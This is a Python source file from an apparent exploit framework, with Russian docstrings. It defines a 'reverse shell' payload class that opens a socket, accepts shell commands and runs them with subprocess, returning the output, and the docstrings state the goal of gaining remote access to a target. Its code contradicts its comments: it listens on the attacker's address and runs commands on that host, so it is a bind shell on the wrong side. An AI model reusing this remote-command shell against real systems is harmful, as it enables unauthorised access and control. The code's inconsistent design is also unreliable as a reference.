# File: exploits/payloads/reverse_shell.py

import socket
import subprocess
import threading
from typing import Optional

from exploits.payloads.payload_base import PayloadBase


class ReverseShellPayload(PayloadBase):
    """
    Payload для установки обратного shell соединения с атакующим.

    Используется для получения удаленного доступа к системе цели.

    Класс наследует базовый интерфейс PayloadBase.
    """

    def __init__(self, target: str, port: int, attacker_ip: str, attacker_port: int):
        """
        Инициализация полезной нагрузки обратного shell.

        :param target: адрес цели (используется для логики подключения)
        :param port: порт цели (не используется напрямую)
        :param attacker_ip: IP-адрес атакующего для обратного подключения
        :param attacker_port: порт атакующего для обратного подключения
        """
        super().__init__(target, port)
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.sock: Optional[socket.socket] = None

    def prepare(self) -> bool:
        """
        Подготовка payload: здесь можно добавить генерацию скрипта или shellcode,
        но в данном случае подготовки не требуется.

        :return: True — подготовка успешна
        """
        return True

    def _handle_connection(self, conn: socket.socket):
        """
        Обрабатывает сессию обратного shell, принимая команды и возвращая вывод.

        :param conn: установленное соединение с атакующим
        """
        try:
            while True:
                conn.send(b"$ ")
                cmd = b""
                while not cmd.endswith(b"\n"):
                    chunk = conn.recv(1024)
                    if not chunk:
                        return
                    cmd += chunk
                command = cmd.decode().strip()
                if command.lower() == "exit":
                    break

                proc = subprocess.Popen(command, shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                conn.send(stdout + stderr)
        finally:
            conn.close()

    def execute(self) -> bool:
        """
        Запускает сервер для обратного shell на атакующем хосте.
        При установке соединения обрабатывает сессию.

        :return: True при успешном запуске сервера
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.attacker_ip, self.attacker_port))
            self.sock.listen(1)
            # Ожидание подключения цели
            conn, _ = self.sock.accept()
            self._handle_connection(conn)
            return True
        except Exception:
            return False

    def cleanup(self) -> None:
        """
        Закрывает сокет при завершении работы.
        """
        if self.sock:
            self.sock.close()
            self.sock = None
